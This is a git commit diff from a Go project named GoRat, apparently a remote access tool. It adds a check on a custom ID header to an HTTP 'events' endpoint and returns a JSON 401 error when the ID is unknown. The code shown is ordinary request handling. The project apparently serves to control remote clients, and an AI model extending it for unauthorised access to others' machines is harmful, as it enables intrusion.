366bce3ebc4d6013617f24a9e5710aff42eac359
NotKatsu <122122838+NotKatsu@users.noreply.github.com>
2023-07-25 12:41:17 +0100

    Check to see if Custom ID is valid

--- modules/endpoints/events.go
+++ modules/endpoints/events.go
@@ -5,13 +5,37 @@ import (
 	"fmt"
 	"net/http"
 
+	"github.com/NotKatsu/GoRat/modules/database"
+
 	"github.com/pterm/pterm"
 )
 
 func EventsGet(w http.ResponseWriter, r *http.Request) {
 	if r.Method == "GET" {
-		fmt.Fprint(w, "Correct method was used.")
-		
+		customID := r.Header.Get("ID")
+
+		if customID == "" || database.GetConnectionData(customID) == "" {
+			invalidIDError := Error{
+				ErrorCode:    http.StatusUnauthorized,
+				ErrorMessage: "Data could not be retrived as ID is not valid.",
+			}
+			w.WriteHeader(http.StatusUnauthorized)
+
+			invalidIDErrorJson, err := json.Marshal(invalidIDError)
+
+			if err != nil {
+				pterm.Fatal.WithFatal(true).Println(err)
+			} else {
+				_, err := w.Write(invalidIDErrorJson)
+
+				if err != nil {
+					pterm.Fatal.WithFatal(true).Println(err)
+				}
+			}
+		} else {
+			fmt.Fprintf(w, "Everything looks all good and you are authorized.")
+		}
+
 	} else {
 		wrongMethodError := Error{
 			ErrorCode:    http.StatusMethodNotAllowed,
